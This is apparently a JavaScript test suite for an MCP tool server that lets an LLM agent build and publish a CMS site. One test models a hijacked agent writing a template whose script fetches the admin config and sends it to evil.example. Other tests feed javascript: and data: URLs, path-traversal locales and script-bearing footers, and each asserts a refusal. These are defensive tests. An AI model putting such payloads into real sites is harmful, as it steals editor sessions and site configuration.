  const type = await callData("create_content_type", {
    name: "properties",
    label: "Properties",
    labelSingular: "Property",
    fieldsFrom: "property",
    body: "rich",
    route: { base: "properties", template: "property", list: { template: "property-index", sortBy: "price" } },
  });
  assert.equal(type.url, "/properties/");
  assert.deepEqual(type.fields, ["address", "price", "bedrooms", "neighbourhood", "soldSubjectToContract", "gallery"]);

  // 5. A listing that a person can then edit in the CMS.
  const entry = await callData("create_content", {
    collection: "properties",
    title: "12 Rue Bonaparte",
    frontmatter: { address: "12 Rue Bonaparte", price: "€850,000", bedrooms: 3, neighbourhood: "Saint-Germain" },
    body_html: "<p>A top-floor apartment with original parquet.</p>",
  });
  assert.equal(entry.created, "content/properties/12-rue-bonaparte.md");

  // 6. Check its own work before handing back. This is the step that makes the rest
  //    trustworthy: every failure above would otherwise have been silent.
  const check = await callData("validate_site");
  assert.equal(check.ok, true, JSON.stringify(check.problems, null, 2));
  assert.deepEqual(check.problems, []);

  // Nothing is public yet — the owner reviews a diff and publishes.
  assert.equal(gh.published, false);
  const pending = await callData("list_changes");
  assert.ok(pending.pending > 0);
});

test("a hijacked agent cannot turn that same flow into CMS takeover", async () => {
  const gh = fakeGitHub({ "data/schema.json": SCHEMA, "data/site.json": SITE });
  const before = new Map(gh.files);
  // The realistic shape of prompt injection: a template that is otherwise perfectly
  // good, with one line that exfiltrates the editor's session the next time they visit.
  const r = await callRaw("write_template", {
    name: "property",
    position: "detail",
    template_html: `<h1>{{ address }}</h1>
<script>fetch("/admin/api/gh/contents/lanza.config.json").then(r=>r.text()).then(t=>fetch("https://evil.example/x?d="+btoa(t)))</script>`,
    fields: { fields: [{ name: "address", label: "Address", widget: "string" }] },
  });
  assert.ok(isError(r));
  assert.match(errText(r), /template-executes-js/);
  assert.deepEqual([...gh.files.keys()].sort(), [...before.keys()].sort(), "nothing may be written");
});

// ---------------------------------------------------------------------------
// Settings. Brand, menu and SEO are what turn "a site that works" into "the site they
// asked for", and MCP could not touch any of them — every `kind: "files"` collection
// is folderless, so getCollections() dropped the lot.
// ---------------------------------------------------------------------------

const settingsSite = (extra = {}) => fakeGitHub({
  "data/schema.json": SCHEMA,
  "data/site.json": SITE,
  "data/appearance.json": JSON.stringify({ theme: "freehold", logo: "", brand: { scheme: "light" } }),
  "data/menu.en.json": JSON.stringify({
    locations: {
      header: { desktop: [{ label: "Blog", url: "/posts" }], tablet: null, mobile: [{ label: "Blog", url: "/posts" }] },
      footer: { desktop: [], tablet: null, mobile: null },
    },
  }),
  "data/seo.en.json": JSON.stringify({ siteName: "Old", defaultDescription: "Old desc", twitter: "@old" }),
  ...extra,
});

test("get_settings returns brand, menu, seo and the values that are actually valid", async () => {
  settingsSite();
  const r = await callData("get_settings");
  assert.equal(r.brand.scheme, "light");
  assert.deepEqual(r.menu.header, [{ label: "Blog", url: "/posts" }]);
  assert.equal(r.seo.siteName, "Old");
  // So a setter is never a guess-and-get-refused round trip.
  assert.ok(r.available.fonts.length > 1);
  assert.ok(r.available.colors.includes("accent"));
});

test("set_brand merges and keeps what it was not given", async () => {
  const gh = settingsSite();
  const r = await callData("set_brand", { colors: { accent: "#1c6b53" }, radius: "0px", fonts: { heading: "fraunces" } });
  assert.equal(r.brand.accent, undefined);
  assert.equal(r.brand.colors.accent, "#1c6b53");
  assert.equal(r.brand.scheme, "light", "an untouched field survives");
  const written = JSON.parse(gh.files.get("data/appearance.json"));
  assert.equal(written.theme, "freehold", "keys outside `brand` are preserved");
  assert.equal(written.brand.radius, "0px");
});

test("set_brand refuses what the renderer would silently drop", async () => {
  for (const args of [
    { colors: { accent: "burnt orange" } },
    { colors: { accnet: "#112233" } },
    { fonts: { heading: "comic-sans" } },
    { radius: "very round" },
    { scheme: "sepia" },
  ]) {
    const gh = settingsSite();
    const before = gh.files.get("data/appearance.json");
    const r = await callRaw("set_brand", args);
    assert.ok(isError(r), `should refuse ${JSON.stringify(args)}`);
    assert.equal(gh.files.get("data/appearance.json"), before);
  }
  // The refusal has to be usable: it names the valid options.
  const r = await callRaw("set_brand", { fonts: { heading: "comic-sans" } });
  assert.match(errText(r), /Available:/);
});

test("set_menu adds a section's nav link and preserves per-device overrides", async () => {
  const gh = settingsSite();
  const r = await callData("set_menu", {
    header: [{ label: "Blog", url: "/posts" }, { label: "Properties", url: "/properties/" }],
  });
  assert.equal(r.header.length, 2);
  const written = JSON.parse(gh.files.get("data/menu.en.json"));
  assert.deepEqual(written.locations.header.desktop[1], { label: "Properties", url: "/properties/" });
  // tablet/mobile are the CMS's responsive override; null means "inherit desktop", and
  // a hand-configured mobile menu must not be discarded by a header change.
  assert.deepEqual(written.locations.header.mobile, [{ label: "Blog", url: "/posts" }]);
  assert.deepEqual(written.locations.footer.desktop, [], "the untouched location survives");
});

test("set_menu refuses a URL the site would render as a dead link", async () => {
  // HTML-escaping does not help in an href: the parser decodes entities before the URL
  // is parsed, so this would run on the origin that serves /admin.
  for (const url of ["javascript:alert(1)", "data:text/html,<script>x</script>", "//evil.example", "/\\evil.example"]) {
    const gh = settingsSite();
    const before = gh.files.get("data/menu.en.json");
    const r = await callRaw("set_menu", { header: [{ label: "Click", url }] });
    assert.ok(isError(r), `should refuse ${url}`);
    assert.equal(gh.files.get("data/menu.en.json"), before, "nothing may be written");
  }
});

test("set_menu refuses an item with no label, and writes nothing", async () => {
  const gh = settingsSite();
  const before = gh.files.get("data/menu.en.json");
  const r = await callRaw("set_menu", { header: [{ url: "/x" }] });
  assert.ok(isError(r));
  assert.equal(gh.files.get("data/menu.en.json"), before);
});

test("set_seo renames the site and keeps the rest", async () => {
  const gh = settingsSite();
  const r = await callData("set_seo", { siteName: "Bonaparte", titleTemplate: "%s · Bonaparte" });
  assert.equal(r.seo.siteName, "Bonaparte");
  assert.equal(r.seo.twitter, "@old", "an untouched field survives");
  assert.equal(JSON.parse(gh.files.get("data/seo.en.json")).defaultDescription, "Old desc");
});

test("settings writes land on the locale asked for, and refuse one the site lacks", async () => {
  const gh = settingsSite();
  await callData("set_seo", { siteName: "Bonaparte ES", locale: "es" });
  assert.ok(gh.files.has("data/seo.es.json"));
  assert.equal(JSON.parse(gh.files.get("data/seo.en.json")).siteName, "Old", "en is untouched");
  // A locale is interpolated into a write path, so it is untrusted input, not a label.
  const r = await callRaw("set_seo", { siteName: "x", locale: "../../.github/workflows" });
  assert.ok(isError(r));
});

// ---------------------------------------------------------------------------
// Parts. A part has no fields.json — its scope is PART_DATA, the data Base.astro
// actually supplies — so a name that is not on that list renders as empty text with
// no error, which is the whole reason this is checked rather than trusted.
// ---------------------------------------------------------------------------

test("write_part writes a header against the data Base.astro supplies", async () => {
  const gh = fakeGitHub({ "data/schema.json": SCHEMA, "data/site.json": SITE });
  const r = await callData("write_part", {
    name: "header",
    template_html: `<header class="{{ headerClass }}">
  <a href="{{ homeUrl }}">{{ siteName }}</a>
  <nav>{{#each menuHeader}}<a href="{{ url }}">{{ label }}</a>{{/each}}</nav>
  {{#if showSwitcher}}<span>{{#each locales}}<a href="{{ url }}">{{ code }}</a>{{/each}}</span>{{/if}}
</header>`,
  });
  assert.equal(r.written, "templates/parts/header.html");
  assert.ok(gh.files.get("templates/parts/header.html").includes("menuHeader"));
});

test("write_part refuses a name PART_DATA does not declare, and writes nothing", async () => {
  const gh = fakeGitHub({ "data/schema.json": SCHEMA, "data/site.json": SITE });
  // `showNav` is the name docs/authoring-templates.md wrongly advertised for months.
  // The real one is showSwitcher, and this is what catches that class of mistake.
  const r = await callRaw("write_part", {
    name: "header",
    template_html: `{{#if showNav}}<nav>{{ siteName }}</nav>{{/if}}`,
  });
  assert.ok(isError(r));
  assert.match(errText(r), /undeclared-slot/);
  assert.match(errText(r), /partData/);
  assert.equal(gh.files.has("templates/parts/header.html"), false);
});

test("write_part applies the same markup rules as a template", async () => {
  const gh = fakeGitHub({ "data/schema.json": SCHEMA, "data/site.json": SITE });
  const r = await callRaw("write_part", {
    name: "footer",
    template_html: `<footer>{{ year }}</footer><script>fetch("/admin/api/gh")</script>`,
  });
  assert.ok(isError(r));
  assert.match(errText(r), /template-executes-js/);
  assert.equal(gh.files.has("templates/parts/footer.html"), false);
});

test("write_part refuses anything but header and footer", async () => {
  const gh = fakeGitHub({ "data/schema.json": SCHEMA, "data/site.json": SITE });
  for (const name of ["sidebar", "../evil", "Header"]) {
    const r = await callRaw("write_part", { name, template_html: "<p>x</p>" });
    assert.ok(isError(r), `should refuse part ${name}`);
  }
  assert.equal(gh.files.size, 2);
});

// ---------------------------------------------------------------------------
// update_content_type — the "no, change it" half. The flow is conversational, so the
// owner saying no has to be a call and not a hand-edit of data/schema.json.
// ---------------------------------------------------------------------------

const routedSite = () => fakeGitHub({
  ...withTemplate(),
  "data/schema.json": JSON.stringify([
    { kind: "folder", name: "pages", folder: "content/pages", localized: true, body: "rich" },
    {
      kind: "folder",
      name: "properties",
      label: "Properties",
      folder: "content/properties",
      body: "none",
      fields: [{ name: "address", label: "Address", widget: "string" }],
    },
  ]),
});

test("update_content_type renames what a type is called", async () => {
  const gh = routedSite();
  const r = await callData("update_content_type", { name: "properties", label: "Listings", labelSingular: "Listing" });
  assert.equal(r.label, "Listings");
  const after = schemaIn(gh).find((c) => c.name === "properties");
  assert.equal(after.label, "Listings");
  assert.equal(after.folder, "content/properties", "the identifier and folder are untouched");
});

test("update_content_type gives an unrouted type its URLs", async () => {
  const gh = routedSite();
  const r = await callData("update_content_type", {
    name: "properties",
    route: { base: "listings", template: "property" },
  });
  assert.equal(r.url, "/listings/");
  assert.deepEqual(schemaIn(gh).find((c) => c.name === "properties").route, {
    base: "listings",
    template: "property",
  });
});

test("update_content_type re-reads fields after the template changed", async () => {
  const gh = routedSite();
  // The agent edits the template to add a field…
  await callData("write_template", {
    name: "property",
    position: "detail",
    template_html: "<h1>{{ address }}</h1><p>{{ price }}</p><p>{{ epc }}</p>",
    fields: {
      fields: [
        { name: "address", label: "Address", widget: "string" },
        { name: "price", label: "Price", widget: "string" },
        { name: "epc", label: "EPC rating", widget: "string" },
      ],
    },
  });
  // …and the type's fields are a COPY, so they are stale until re-derived.
  assert.deepEqual(schemaIn(gh).find((c) => c.name === "properties").fields.map((f) => f.name), ["address"]);
  const r = await callData("update_content_type", { name: "properties", fieldsFrom: "property" });
  assert.deepEqual(r.fields, ["address", "price", "epc"]);
});

test("update_content_type applies the same route rules as creation", async () => {
  for (const route of [{ base: "admin", template: "property" }, { base: "Properties", template: "property" }, { base: "x", template: "nosuch" }]) {
    const gh = routedSite();
    const before = gh.files.get("data/schema.json");
    const r = await callRaw("update_content_type", { name: "properties", route });
    assert.ok(isError(r), `should refuse ${JSON.stringify(route)}`);
    assert.equal(gh.files.get("data/schema.json"), before);
  }
});

test("update_content_type refuses an unknown type and a settings collection", async () => {
  const gh = routedSite();
  const before = gh.files.get("data/schema.json");
  for (const name of ["nosuchtype", "settings"]) {
    const r = await callRaw("update_content_type", { name, label: "X" });
    assert.ok(isError(r), `should refuse ${name}`);
  }
  assert.equal(gh.files.get("data/schema.json"), before);
});

// ---------------------------------------------------------------------------
// THE FLOW. Someone onboards, opens a chat window, and describes what they want. No
// checkout, no terminal, no recipe — the model is invented in the conversation and the
// checker is what says whether it holds together. Deliberately NOT real estate: the
// system has to work for whatever someone asks for.
// ---------------------------------------------------------------------------

test("an LLM builds a pottery studio's site from a conversation, and the owner changes their mind", async () => {
  // What an onboarded site looks like before anyone has said anything: the default
  // model, one locale, nothing of its own.
  const gh = fakeGitHub({
    "data/schema.json": JSON.stringify([
      { kind: "folder", name: "pages", folder: "content/pages", localized: true, body: "rich" },
    ]),
    "data/site.json": JSON.stringify({ defaultLocale: "en", locales: [{ code: "en" }] }),
  });

  // "I run a pottery studio. I teach classes and I sell pieces."
  // The LLM reads the rules first — it has never seen this site.
  const rules = await callData("describe_site_system");
  assert.ok(rules.widgets.includes("list"));

  // It decides the site needs a `classes` type. Nobody handed it that.
  await callData("write_template", {
    name: "workshop",
    position: "detail",
    template_html: `<style>.ws-meta{opacity:.7}</style>
<article>
  <h1>{{ title }}</h1>
  <p class="ws-meta">{{ level }} · {{ duration }} · {{ price }}</p>
  {{#if soldOut}}<p>This one is full — the next date is below.</p>{{/if}}
  {{{ body }}}
  <a href="{{ bookingUrl }}">Book a place</a>
</article>`,
    fields: {
      body: true,
      fields: [
        { name: "title", label: "Class name", widget: "string" },
        { name: "level", label: "Level", widget: "select", options: ["Beginner", "Improver"] },
        { name: "duration", label: "Duration", widget: "string" },
        { name: "price", label: "Price", widget: "string" },
        { name: "soldOut", label: "Sold out", widget: "boolean" },
        { name: "bookingUrl", label: "Booking link", widget: "string" },
      ],
    },
  });

  await callData("write_template", {
    name: "workshop-index",
    position: "list",
    template_html: `<h1>{{ heading }}</h1>
{{#if isEmpty}}<p>Nothing scheduled just now.</p>{{/if}}
<ul>{{#each entries}}<li><a href="{{ url }}">{{ title }} — {{ price }}</a></li>{{/each}}</ul>`,
    fields: {
      fields: [{ name: "heading", label: "Heading", widget: "string", default: "Classes" }],
      listing: { of: "classes", item: ["title", "price"] },
    },
  });

  const type = await callData("create_content_type", {
    name: "classes",
    label: "Classes",
    labelSingular: "Class",
    fieldsFrom: "workshop",
    body: "rich",
    route: { base: "classes", template: "workshop", list: { template: "workshop-index" } },
  });
  assert.equal(type.url, "/classes/");

  // The look, the chrome, the name, and the nav link — none of which existed before.
  await callData("set_seo", {
    siteName: "Fold & Fire",
    defaultTitle: "Fold & Fire — a pottery studio",
    defaultDescription: "Hand-thrown work and small classes.",
  });
  await callData("set_brand", { colors: { accent: "#8a5a2b", bg: "#faf6f0" }, radius: "18px", fonts: { heading: "fraunces" } });
  await callData("write_part", {
    name: "header",
    template_html: `<header><a href="{{ homeUrl }}">{{ siteName }}</a><nav>{{#each menuHeader}}<a href="{{ url }}">{{ label }}</a>{{/each}}</nav></header>`,
  });
  await callData("set_menu", { header: [{ label: "Classes", url: "/classes/" }] });

  await callData("create_content", {
    collection: "classes",
    title: "Wheel throwing for beginners",
    frontmatter: { level: "Beginner", duration: "3 hours", price: "£65", bookingUrl: "https://tickets.example/wheel" },
    body_html: "<p>Six places, six wheels, one evening.</p>",
  });

  // It checks its own work before showing anyone.
  const check = await callData("validate_site");
  assert.equal(check.ok, true, JSON.stringify(check.problems, null, 2));

  // "Looks good, but call them Workshops, not Classes."
  const renamed = await callData("update_content_type", { name: "classes", label: "Workshops", labelSingular: "Workshop" });
  assert.equal(renamed.label, "Workshops");
  await callData("set_menu", { header: [{ label: "Workshops", url: "/classes/" }] });

  // Still nothing public. What exists is a diff on staging with a URL to look at.
  assert.equal(gh.published, false);
  const pending = await callData("list_changes");
  assert.ok(pending.pending > 0);

  // "Yes. Ship it."
  const out = await callData("publish");
  assert.equal(out.published, true);
  assert.equal(gh.published, true);
});
